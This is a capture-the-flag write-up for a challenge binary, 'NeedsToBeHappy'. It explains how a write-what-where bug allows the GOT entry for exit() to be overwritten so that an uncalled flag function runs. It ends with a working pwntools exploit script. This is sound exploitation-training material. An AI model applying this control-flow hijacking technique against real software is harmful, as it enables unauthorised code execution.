# ðŸ”‘ Write-Up

The binary provides a trivial write-what-where so it would be a good idea to overwrite some entry in the GOT in order to get control of the program control flow.
A good candidate for the overwrite would be (as usual) the `exit()` function.
The function that (sort of) gives us the flag is `give_the_man_a_cat()` but it's never called anywhere.
By overwriting the GOT entry for `exit()` we can call the required function and get the flag.

```python
from pwn import *  

context.binary = "./NeedsToBeHappy"
e: ELF = context.binary 
p = process()
p.sendline(b"y")
p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(e.got["exit"]).encode("ascii"))
p.interactive()
```
